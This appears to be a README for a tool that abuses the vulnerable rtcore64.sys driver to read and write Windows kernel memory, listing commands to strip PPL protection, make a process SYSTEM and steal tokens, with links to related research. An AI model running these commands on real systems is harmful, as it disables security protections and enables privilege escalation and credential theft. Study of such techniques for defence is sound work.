# rtcore-fpc
Playing with unsecured driver(s) allowing read/write to kernel memory.</br></br>
For now, playing with EPROCESS :</br>
-removing PPL flag</br>
-stealing system token</br>
</br>

memRW.exe load "%cd%\rtcore64.sys"</br>
memRW.exe list</br>
memRW.exe removeppl PID</br>
memRW.exe makesystem PID</br>
memRW.exe stealtoken from_pid to_pid</br>
memRW.exe unload "%cd%\rtcore64.sys"</br>
</br>

Greatly inspired by https://github.com/RedCursorSecurityConsulting/PPLKiller </br>

Tools to check EPROCESS struct : https://ntdiff.github.io/ </br>

Detailed EPROCESS struc : https://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/eprocess/index.htm </br>

Bunch of other drivers to look at : https://guidedhacking.com/threads/how-to-bypass-kernel-anticheat-develop-drivers.11325/ </br>

Must read (mimikatz 4 ever...) : https://posts.specterops.io/mimidrv-in-depth-4d273d19e148 </br>
